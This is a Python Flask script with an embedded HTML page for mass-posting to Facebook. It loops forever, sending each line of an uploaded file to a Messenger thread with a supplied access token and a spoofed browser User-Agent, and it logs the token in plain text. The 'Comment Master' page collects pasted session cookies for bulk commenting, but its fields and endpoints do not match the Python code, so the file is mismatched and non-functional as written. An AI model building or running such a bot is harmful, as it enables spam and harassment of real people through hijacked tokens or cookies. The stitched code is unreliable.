from flask import Flask, request
import requests
from time import sleep
import time
from datetime import datetime
app = Flask(__name__)
app.debug = True

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        access_token = request.form.get('accessToken')
        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        while True:
            try:
                for message1 in messages:
                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                    message = str(mn) + ' ' + message1
                    parameters = {'access_token': access_token, 'message': message}
                    response = requests.post(api_url, data=parameters, headers=headers)
                    if response.status_code == 200:
                        print(f"Message sent using token {access_token}: {message}")
                    else:
                        print(f"Failed to send message using token {access_token}: {message}")
                    time.sleep(time_interval)
            except Exception as e:
                print(f"Error while sending message using token {access_token}: {message}")
                print(e)
                time.sleep(30)


    return '''
    
<!DOCTYPE html>
<html>
<head>
    <title>Facebook Comment Master</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        .task-box {
            border: 1px solid #ddd;
            padding: 15px;
            margin-bottom: 10px;
            border-radius: 5px;
        }
        .live-logs {
            height: 400px;
            overflow-y: auto;
            background: #1a1a1a;
            color: #00ff00;
            padding: 10px;
        }
    </style>
</head>
<body>
    <div class="container mt-4">
        <h2 class="text-center mb-4">Advanced Facebook Comment System</h2>
        
        <form id="mainForm" enctype="multipart/form-data">
            <div class="row g-3">
                <div class="col-md-6">
                    <div class="mb-3">
                        <label class="form-label">JSON Cookies</label>
                        <textarea class="form-control" name="cookies" rows="5" required></textarea>
                    </div>
                    
                    <div class="mb-3">
                        <label class="form-label">Post ID</label>
                        <input type="text" class="form-control" name="post_id" required>
                    </div>
                </div>
                
                <div class="col-md-6">
                    <div class="row mb-3">
                        <div class="col-md-6">
                            <label class="form-label">Name Prefix</label>
                            <input type="text" class="form-control" name="prefix" required>
                        </div>
                        <div class="col-md-6">
                            <label class="form-label">Name Suffix</label>
                            <input type="text" class="form-control" name="suffix" required>
                        </div>
                    </div>
                    
                    <div class="mb-3">
                        <label class="form-label">Comments File</label>
                        <input type="file" class="form-control" name="comments_file" required>
                    </div>
                    
                    <div class="mb-3">
                        <label class="form-label">Delay (Seconds)</label>
                        <input type="number" class="form-control" name="delay" value="10" min="5" required>
                    </div>
                </div>
            </div>
            
            <button type="submit" class="btn btn-success w-100">Start Commenting</button>
        </form>

        <div class="mt-4">
            <h4>Active Tasks</h4>
            <div id="tasksContainer"></div>
        </div>

        <div class="mt-4">
            <h4>Live Monitoring</h4>
            <div class="live-logs" id="liveLogs"></div>
        </div>
    </div>

    <script>
        const form = document.getElementById('mainForm');
        const tasksContainer = document.getElementById('tasksContainer');
        const liveLogs = document.getElementById('liveLogs');
        
        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            const formData = new FormData(form);
            
            try {
                const response = await fetch('/start', {
                    method: 'POST',
                    body: formData
                });
                
                const result = await response.json();
                if(result.task_id) {
                    startTaskMonitoring(result.task_id);
                }
            } catch(error) {
                alert('Error: ' + error.message);
            }
        });

        function startTaskMonitoring(taskId) {
            const taskBox = document.createElement('div');
            taskBox.className = 'task-box';
            taskBox.innerHTML = `
                <h5>Task ID: ${taskId}</h5>
                <div id="stats-${taskId}">Loading...</div>
                <button onclick="stopTask('${taskId}')" class="btn btn-danger btn-sm">Stop</button>
                <hr>
            `;
            tasksContainer.prepend(taskBox);
            
            // Start polling for updates
            setInterval(async () => {
                const response = await fetch(`/status/${taskId}`);
                const data = await response.json();
                
                if(data.status) {
                    document.getElementById(`stats-${taskId}`).innerHTML = `
                        Status: ${data.status}<br>
                        Success: ${data.success || 0}<br>
                        Failed: ${data.failed || 0}<br>
                        Total Cookies: ${data.cookies_used || 0}
                    `;
                }
                
                // Update logs
                const logsResponse = await fetch(`/logs/${taskId}`);
                const logs = await logsResponse.json();
                liveLogs.innerHTML = logs.join('<br>');
                liveLogs.scrollTop = liveLogs.scrollHeight;
            }, 2000);
        }

        function stopTask(taskId) {
            fetch(`/stop/${taskId}`);
        }
    </script>
</body>
</html>
